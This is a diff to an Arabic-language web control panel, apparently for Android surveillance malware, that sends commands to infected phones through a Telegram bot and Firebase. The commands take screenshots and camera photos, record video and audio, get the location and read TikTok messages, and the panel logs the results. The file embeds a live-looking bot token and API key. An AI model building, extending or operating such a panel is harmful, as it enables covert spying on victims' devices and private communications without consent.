+                                <button class="cmd-btn primary" onclick="sendCmd('/info')">
+                                    <span class="ico">📊</span> معلومات الجهاز
+                                </button>
+                                <button class="cmd-btn success" onclick="sendCmd('/location')">
+                                    <span class="ico">📍</span> الموقع الحالي
+                                </button>
+                                <button class="cmd-btn warn" onclick="sendCmd('/screen')">
+                                    <span class="ico">📷</span> لقطة شاشة
+                                </button>
+                                <button class="cmd-btn warn" onclick="sendCmd('/video')">
+                                    <span class="ico">📹</span> تسجيل فيديو
+                                </button>
+                                <button class="cmd-btn" onclick="sendCmd('/menu')">
+                                    <span class="ico">📋</span> القائمة الكاملة
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="cmd-group">
+                            <div class="cmd-group-title">الكاميرا والصوت</div>
+                            <div class="cmd-btns two-col">
+                                <button class="cmd-btn purple" onclick="sendCmd('/cam_front')">
+                                    <span class="ico">🤳</span> كاميرا أمامية
+                                </button>
+                                <button class="cmd-btn purple" onclick="sendCmd('/cam_back')">
+                                    <span class="ico">📸</span> كاميرا خلفية
+                                </button>
+                                <button class="cmd-btn success" onclick="sendCmd('/audio_start')">
+                                    <span class="ico">🎤</span> بدء التسجيل
+                                </button>
+                                <button class="cmd-btn danger" onclick="sendCmd('/audio_stop')">
+                                    <span class="ico">⏹</span> إيقاف التسجيل
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="cmd-group">
+                            <div class="cmd-group-title">التحكم بالتيك توك</div>
+                            <div class="cmd-btns two-col">
+                                <button class="cmd-btn" onclick="sendCmd('/tiktok')">
+                                    <span class="ico">🎵</span> فتح تيك توك
+                                </button>
+                                <button class="cmd-btn" onclick="sendCmd('/tiktok_messages')">
+                                    <span class="ico">💬</span> المحادثات
+                                </button>
+                                <button class="cmd-btn" onclick="sendCmd('/tiktok_read')">
+                                    <span class="ico">👁</span> قراءة الشاشة
+                                </button>
+                                <button class="cmd-btn danger" onclick="sendCmd('/screen_stop')">
+                                    <span class="ico">🛑</span> إيقاف اللقطات
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Log Panel -->
+                <div class="log-panel">
+                    <div class="log-head">
+                        <div class="log-title">
+                            <span class="ico">💬</span>
+                            <span>سجل النشاط</span>
+                        </div>
+                        <div class="log-controls">
+                            <div class="log-tabs">
+                                <button class="log-tab on" onclick="filterLog(this, 'all')">الكل</button>
+                                <button class="log-tab" onclick="filterLog(this, 'user')">أنا</button>
+                                <button class="log-tab" onclick="filterLog(this, 'bot')">البوت</button>
+                                <button class="log-tab" onclick="filterLog(this, 'photo')">صور</button>
+                            </div>
+                            <div class="icon-btn" onclick="loadMessages(true)" title="تحديث">🔄</div>
+                        </div>
+                    </div>
+                    <div class="log-body" id="logBody">
+                        <div class="log-empty">
+                            <div class="ico">📭</div>
+                            <p>لا يوجد نشاط بعد</p>
+                        </div>
+                    </div>
+                </div>
+            </main>
         </div>
     </div>
+
+    <div class="toast" id="toast"></div>
 
     <div class="modal" id="imgModal" onclick="closeModal()">
         <button class="modal-close" onclick="closeModal()">×</button>
@@ -184,6 +865,9 @@
     </div>
 
     <script>
+        // ═══════════════════════════════════════
+        //  الإعدادات
+        // ═══════════════════════════════════════
         const TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM";
         const TELEGRAM_CHAT_ID = "8599240795";
         const FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg";
@@ -197,6 +881,20 @@
         let lastUpdateId = 0;
         let messageCache = {};
         let selectedDevice = null;
+        let allMessages = [];
+        let currentFilter = 'all';
+        let deviceNames = JSON.parse(localStorage.getItem('device_names') || '{}');
+
+        // ═══════════════════════════════════════
+        //  Toast
+        // ═══════════════════════════════════════
+        function toast(msg, type = 'wait') {
+            const t = document.getElementById('toast');
+            t.textContent = msg;
+            t.className = 'toast show ' + type;
+            clearTimeout(window.__toastTm);
+            window.__toastTm = setTimeout(() => t.classList.remove('show'), 3000);
+        }
 
         // ═══════════════════════════════════════
         //  الأجهزة
@@ -205,96 +903,128 @@
             try {
                 const res = await fetch(`${FS_DEVICES}?key=${FIREBASE_API_KEY}&pageSize=100`);
                 const data = await res.json();
-
-                const devicesList = document.getElementById('devicesList');
                 const docs = data.documents || [];
 
+                const list = document.getElementById('devicesList');
+
                 if (docs.length === 0) {
-                    devicesList.innerHTML = '<div class="empty"><div class="empty-icon">📱</div>لا أجهزة مسجّلة بعد</div>';
+                    list.innerHTML = '<div class="empty-devices"><div class="ico">📭</div><p>لا أجهزة مسجّلة بعد</p></div>';
                     document.getElementById('statDevices').textContent = '0';
                     document.getElementById('statActive').textContent = '0';
+                    document.getElementById('devCount').textContent = '0';
                     return;
                 }
 
-                // تحويل البيانات
                 const devices = docs.map(d => {
                     const f = d.fields || {};
                     const lastSeen = parseInt(f.last_seen_ms?.integerValue || '0');
-                    const installedAt = parseInt(f.installed_at_ms?.integerValue || '0');
-                    const isActive = (Date.now() - lastSeen) < 10 * 60 * 1000; // آخر 10 دقائق
-
                     return {
                         id: f.id?.stringValue || '',
                         brand: f.brand?.stringValue || '',
                         manufacturer: f.manufacturer?.stringValue || '',
                         model: f.model?.stringValue || '',
                         android: f.android?.stringValue || '',
-                        sdk: f.sdk?.integerValue || '',
                         lastSeen: lastSeen,
-                        installedAt: installedAt,
-                        isActive: isActive
+                        isActive: (Date.now() - lastSeen) < 10 * 60 * 1000
                     };
                 }).sort((a, b) => b.lastSeen - a.lastSeen);
 
-                // إحصائيات
                 document.getElementById('statDevices').textContent = devices.length;
                 document.getElementById('statActive').textContent = devices.filter(d => d.isActive).length;
+                document.getElementById('devCount').textContent = devices.length;
 
-                // عرض
-                devicesList.innerHTML = '';
-                for (const d of devices) {
-                    const card = document.createElement('div');
-                    card.className = 'device-card ' + (d.isActive ? 'active' : 'inactive');
-                    card.onclick = () => selectDevice(d);
-
-                    const lastSeenStr = d.lastSeen > 0
-                        ? new Date(d.lastSeen).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' })
-                        : '—';
-
-                    card.innerHTML = `
-                        <div class="device-icon">📱</div>
-                        <div class="device-info">
-                            <div class="device-name">${escapeHtml(d.manufacturer)} ${escapeHtml(d.model)}</div>
-                            <div class="device-meta">Android ${escapeHtml(d.android)} • ${escapeHtml(d.id)}</div>
-                            <div class="device-meta">آخر ظهور: ${lastSeenStr}</div>
-                        </div>
-                        <div class="device-status ${d.isActive ? 'active' : 'inactive'}">
-                            ${d.isActive ? '🟢 نشط' : '🔴 خامل'}
-                        </div>
-                    `;
-                    devicesList.appendChild(card);
-                }
+                list.innerHTML = '';
+                for (const d of devices) list.appendChild(buildDeviceCard(d));
             } catch (e) {
-                console.error('loadDevices err', e);
-                document.getElementById('devicesList').innerHTML = '<div class="empty"><div class="empty-icon">⚠️</div>تعذّر تحميل الأجهزة</div>';
+                console.error(e);
+                document.getElementById('devicesList').innerHTML = '<div class="empty-devices"><div class="ico">⚠️</div><p>تعذّر تحميل الأجهزة</p></div>';
             }
+        }
+
+        function buildDeviceCard(d) {
+            const card = document.createElement('div');
+            card.className = 'device-card ' + (d.isActive ? 'active' : 'inactive');
+            if (selectedDevice && selectedDevice.id === d.id) card.classList.add('selected');
+            card.onclick = (e) => {
+                if (e.target.closest('.dev-edit') || e.target.tagName === 'INPUT') return;
+                selectDevice(d);
+            };
+
+            const customName = deviceNames[d.id] || '';
+            const displayName = customName || `${d.manufacturer} ${d.model}`;
+
+            const lastSeenStr = d.lastSeen > 0
+                ? new Date(d.lastSeen).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' })
+                : '—';
+
+            card.innerHTML = `
+                <div class="dev-row-1">
+                    <div class="dev-name">
+                        <span>📱</span>
+                        <input type="text" value="${escapeAttr(displayName)}"
+                               placeholder="${escapeAttr(d.manufacturer + ' ' + d.model)}"
+                               data-device-id="${escapeAttr(d.id)}"
+                               onchange="renameDevice(this, '${escapeAttr(d.id)}')"
+                               onclick="event.stopPropagation()">
+                    </div>
+                    <div class="dev-status-pill ${d.isActive ? 'active' : 'inactive'}">
+                        ${d.isActive ? '🟢' : '🔴'}
+                    </div>
+                </div>
+                <div class="dev-row-2">
+                    <div class="meta-item"><b>Android:</b> ${escapeHtml(d.android)}</div>
+                    <div class="meta-item"><b>آخر ظهور:</b> ${lastSeenStr}</div>
+                    <div class="meta-item"><b>ID:</b> ${escapeHtml(d.id)}</div>
+                </div>
+            `;
+            return card;
+        }
+
+        function renameDevice(input, deviceId) {
+            const newName = input.value.trim();
+            if (newName) {
+                deviceNames[deviceId] = newName;
+            } else {
+                delete deviceNames[deviceId];
+            }
+            localStorage.setItem('device_names', JSON.stringify(deviceNames));
+            toast('✅ تم حفظ الاسم', 'ok');
         }
 
         function selectDevice(d) {
             selectedDevice = d;
-            document.getElementById('cmdPanel').style.display = 'block';
-            document.getElementById('selDeviceName').textContent = `${d.manufacturer} ${d.model} — Android ${d.android}`;
-            // scroll to commands
-            document.getElementById('cmdPanel').scrollIntoView({ behavior: 'smooth' });
+            const customName = deviceNames[d.id] || '';
+            const displayName = customName || `${d.manufacturer} ${d.model}`;
+
+            document.getElementById('selName').textContent = displayName;
+            document.getElementById('selSub').textContent = `${d.brand} • Android ${d.android} • ${d.id}`;
+            document.getElementById('cmdPanel').classList.add('show');
+
+            // تحديث البطاقات
+            document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
+            document.querySelectorAll('.device-card').forEach(c => {
+                if (c.querySelector(`input[data-device-id="${d.id}"]`)) c.classList.add('selected');
+            });
+
+            document.getElementById('cmdPanel').scrollIntoView({ behavior: 'smooth', block: 'start' });
         }
 
         function clearSelection() {
             selectedDevice = null;
-            document.getElementById('cmdPanel').style.display = 'none';
+            document.getElementById('cmdPanel').classList.remove('show');
+            document.querySelectorAll('.device-card').forEach(c => c.classList.remove('selected'));
         }
 
         // ═══════════════════════════════════════
-        //  إرسال أمر
+        //  الأوامر
         // ═══════════════════════════════════════
         async function sendCmd(cmd) {
-            if (!selectedDevice) {
-                showStatus('❌ اختر جهازًا أولًا', 'err');
-                return;
-            }
-            showStatus(`⏳ إرسال: ${cmd}`, 'wait');
+            if (!selectedDevice) { toast('اختر جهازًا أولًا', 'err'); return; }
+            toast(`⏳ إرسال: ${cmd}`, 'wait');
+
             try {
-                // نرسل الأمر مع معرف الجهاز في النص
-                const fullCmd = `${cmd}`;
+                // نضيف device_id للتمييز
+                const fullCmd = `${cmd} #${selectedDevice.id}`;
                 const res = await fetch(`${TG_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -302,12 +1032,12 @@
                 });
                 const data = await res.json();
                 if (data.ok) {
-                    showStatus(`✅ ${cmd}`, 'ok');
-                    setTimeout(() => loadMessages(true), 2500);
+                    toast(`✅ ${cmd}`, 'ok');
+                    setTimeout(() => { pullIncoming(); loadMessages(false); }, 2500);
                 } else {
-                    showStatus(`❌ ${data.description}`, 'err');
+                    toast(`❌ ${data.description}`, 'err');
                 }
-            } catch (e) { showStatus(`❌ ${e.message}`, 'err'); }
+            } catch (e) { toast(`❌ ${e.message}`, 'err'); }
         }
 
         // ═══════════════════════════════════════
@@ -324,35 +1054,21 @@
                     lastUpdateId = Math.max(lastUpdateId, u.update_id);
                     const msg = u.message;
                     if (!msg) continue;
-
                     const key = `in_${msg.message_id}`;
                     if (messageCache[key]) continue;
                     messageCache[key] = true;
 
                     if (msg.text) {
-                        await saveToFirestore({
-                            chat_id: msg.chat.id,
-                            type: 'text',
-                            text: msg.text,
-                            time_ms: msg.date * 1000,
-                            from_user: true
-                        });
+                        await saveToFS({ chat_id: msg.chat.id, type: 'text', text: msg.text, time_ms: msg.date * 1000, from_user: true });
                     } else if (msg.photo && msg.photo.length > 0) {
                         const fileId = msg.photo[msg.photo.length - 1].file_id;
-                        await saveToFirestore({
-                            chat_id: msg.chat.id,
-                            type: 'photo',
-                            file_id: fileId,
-                            caption: msg.caption || '',
-                            time_ms: msg.date * 1000,
-                            from_user: true
-                        });
+                        await saveToFS({ chat_id: msg.chat.id, type: 'photo', file_id: fileId, caption: msg.caption || '', time_ms: msg.date * 1000, from_user: true });
                     }
                 }
-            } catch (e) { console.error(e); }
+            } catch (e) {}
         }
 
-        async function saveToFirestore(obj) {
+        async function saveToFS(obj) {
             try {
                 const fields = {};
                 for (const [k, v] of Object.entries(obj)) {
@@ -365,22 +1081,16 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ fields })
                 });
-            } catch (e) { console.error(e); }
+            } catch (e) {}
         }
 
-        async function loadMessages(showStatus2) {
-            if (showStatus2) showStatus('⏳ جلب الرسائل...', 'wait');
+        async function loadMessages(showToast) {
+            if (showToast) toast('⏳ جلب الرسائل...', 'wait');
             try {
                 const res = await fetch(`${FS_MESSAGES}?key=${FIREBASE_API_KEY}&pageSize=500`);
                 const data = await res.json();
 
-                if (!data.documents) {
-                    document.getElementById('logBox').innerHTML = '<div class="empty"><div class="empty-icon">📭</div>لا رسائل بعد</div>';
-                    document.getElementById('statMsgs').textContent = '0';
-                    return;
-                }
-
-                const docs = data.documents.map(d => {
+                allMessages = (data.documents || []).map(d => {
                     const f = d.fields || {};
                     return {
                         type: f.type?.stringValue || 'text',
@@ -392,42 +1102,75 @@
                     };
                 }).sort((a, b) => a.time_ms - b.time_ms);
 
-                document.getElementById('statMsgs').textContent = docs.length;
+                document.getElementById('statMsgs').textContent = allMessages.length;
+                renderLog();
 
-                const logBox = document.getElementById('logBox');
-                logBox.innerHTML = '';
-
-                for (const doc of docs) renderMsg(doc, logBox);
-
-                logBox.scrollTop = logBox.scrollHeight;
-                if (showStatus2) showStatus(`✅ ${docs.length} رسالة`, 'ok');
+                if (showToast) toast(`✅ ${allMessages.length} رسالة`, 'ok');
             } catch (e) {
-                if (showStatus2) showStatus(`❌ ${e.message}`, 'err');
+                if (showToast) toast(`❌ ${e.message}`, 'err');
             }
         }
 
-        function renderMsg(doc, logBox) {
-            const time = new Date(doc.time_ms).toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
-            const isUser = doc.from_user;
+        function renderLog() {
+            const body = document.getElementById('logBody');
 
-            const el = document.createElement('div');
-            el.className = 'msg ' + (isUser ? 'user' : 'bot');
+            let filtered = allMessages;
+            if (currentFilter === 'user') filtered = allMessages.filter(m => m.from_user);
+            else if (currentFilter === 'bot') filtered = allMessages.filter(m => !m.from_user);
+            else if (currentFilter === 'photo') filtered = allMessages.filter(m => m.type === 'photo');
 
-            let content = `<div class="msg-time">${time}</div>`;
-            content += `<div class="msg-from">${isUser ? '👤 أنت' : '🤖 البوت'}</div>`;
-
-            if (doc.type === 'photo' && doc.file_id) {
-                content += `<div class="msg-text">📸 صورة${doc.caption ? ' — ' + escapeHtml(doc.caption) : ''}</div>`;
-                content += `<img class="msg-img" data-file="${doc.file_id}" onclick="openModal(this.src)">`;
-            } else {
-                content += `<div class="msg-text">${escapeHtml(doc.text)}</div>`;
+            if (filtered.length === 0) {
+                body.innerHTML = '<div class="log-empty"><div class="ico">📭</div><p>لا يوجد نشاط</p></div>';
+                return;
             }
 
-            el.innerHTML = content;
-            logBox.appendChild(el);
+            body.innerHTML = '';
+            for (const m of filtered) {
+                const entry = document.createElement('div');
+                const isBot = !m.from_user;
+                const isPhoto = m.type === 'photo';
 
-            const mediaEl = el.querySelector('[data-file]');
-            if (mediaEl) loadMedia(doc.file_id, mediaEl);
+                entry.className = 'log-entry ' + (isBot ? 'from-bot' : 'from-user') + (isPhoto ? ' is-photo' : '');
+
+                const time = new Date(m.time_ms).toLocaleString('ar-EG', {
+                    hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit'
+                });
+
+                let avatarIcon = isBot ? '🤖' : '👤';
+                if (isPhoto) avatarIcon = '📸';
+
+                let contentHtml = '';
+                if (isPhoto && m.file_id) {
+                    contentHtml += `<div class="body">📸 صورة${m.caption ? ' — ' + escapeHtml(m.caption) : ''}</div>`;
+                    contentHtml += `<img data-file="${escapeAttr(m.file_id)}" onclick="openModal(this.src)">`;
+                } else {
+                    contentHtml += `<div class="body">${escapeHtml(m.text)}</div>`;
+                }
+
+                entry.innerHTML = `
+                    <div class="avatar">${avatarIcon}</div>
+                    <div class="content">
+                        <div class="meta">
+                            <span class="who">${isBot ? 'البوت' : 'أنت'}</span>
+                            <span class="when">${time}</span>
+                        </div>
+                        ${contentHtml}
+                    </div>
+                `;
+                body.appendChild(entry);
+
+                const imgEl = entry.querySelector('img[data-file]');
+                if (imgEl) loadMedia(m.file_id, imgEl);
+            }
+
+            body.scrollTop = body.scrollHeight;
+        }
+
+        function filterLog(el, mode) {
+            document.querySelectorAll('.log-tab').forEach(t => t.classList.remove('on'));
+            el.classList.add('on');
+            currentFilter = mode;
+            renderLog();
         }
 
         async function loadMedia(fileId, el) {
@@ -440,15 +1183,13 @@
             } catch (e) {}
         }
 
-        function showStatus(msg, type) {
-            const s = document.getElementById('status');
-            s.textContent = msg;
-            s.className = 'status show ' + type;
-            clearTimeout(window.__st);
-            window.__st = setTimeout(() => s.classList.remove('show'), 4000);
-        }
-
+        // ═══════════════════════════════════════
+        //  Helpers
+        // ═══════════════════════════════════════
         function escapeHtml(s) {
+            return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+        }
+        function escapeAttr(s) {
             return String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
         }
 
@@ -456,8 +1197,13 @@
             document.getElementById('modalImg').src = src;
             document.getElementById('imgModal').classList.add('show');
         }
-        function closeModal() { document.getElementById('imgModal').classList.remove('show'); }
+        function closeModal() {
+            document.getElementById('imgModal').classList.remove('show');
+        }
 
+        // ═══════════════════════════════════════
+        //  التشغيل
+        // ═══════════════════════════════════════
         async function refresh() {
             await pullIncoming();
             await loadMessages(false);
